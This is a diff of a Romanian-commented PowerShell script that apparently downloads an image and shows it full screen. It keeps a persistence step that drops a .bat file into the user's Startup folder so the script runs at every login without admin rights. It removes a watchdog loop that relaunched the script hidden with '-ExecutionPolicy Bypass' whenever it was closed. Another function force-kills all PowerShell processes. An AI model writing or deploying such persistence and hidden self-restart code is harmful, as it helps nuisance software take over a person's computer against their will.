@@ -49,14 +49,14 @@ function Show-FullScreenImage {
     $form.ShowDialog()
 }
 
-# Oprește complet scriptul
+# Oprește complet scriptul și elimină persistenta
 function Stop-All {
     Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat" -Force -ErrorAction SilentlyContinue
     Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Stop-Process -Force
     exit
 }
 
-# Persistență prin folderul Startup (fără Administrator)
+# Persistență prin folderul Startup
 function Set-Startup {
     $scriptPath = $MyInvocation.MyCommand.Path
     $batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat"
@@ -64,19 +64,7 @@ function Set-Startup {
     Set-Content -Path $batFilePath -Value $batContent -Force
 }
 
-# Monitorizare proces pentru repornire automată
-function Monitor-Process {
-    while ($true) {
-        if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
-            Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$MyInvocation.MyCommand.Path`"" -WindowStyle Hidden
-            exit
-        }
-        Start-Sleep -Seconds 1
-    }
-}
-
 # Executare funcționalități
 Download-Image
 Set-Startup
-Start-Job -ScriptBlock { Monitor-Process }
 Show-FullScreenImage
